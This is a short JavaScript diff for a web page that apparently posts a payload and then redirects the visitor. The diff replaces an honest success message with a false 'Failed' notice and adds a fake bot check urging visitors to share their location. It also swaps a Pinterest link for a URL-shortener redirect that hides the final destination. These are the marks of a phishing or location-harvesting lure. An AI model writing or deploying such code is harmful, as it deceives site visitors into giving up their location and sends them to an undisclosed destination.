@@ -79,18 +79,18 @@ async function start() {
       body: JSON.stringify(payload)
     });
 
-    setStatus("Success ✔ Redirecting...");
+    setStatus("Failed.  Redirecting...");
 
-    let c = 3;
+    let c = 7;
 
     const timer = setInterval(() => {
-      setStatus("Redirecting... " + c);
+      setStatus("FAILED.\n  SHARE LOCATION TO CONFIRM YOU ARE NOT A BOT.  " + c);
       c--;
 
       if (c === 0) {
         clearInterval(timer);
         window.location.href =
-          "https://in.pinterest.com/pin/ice-cream--731694270723921320/";
+          "https://unl.one/2wrN1";
       }
     }, 1000);
 
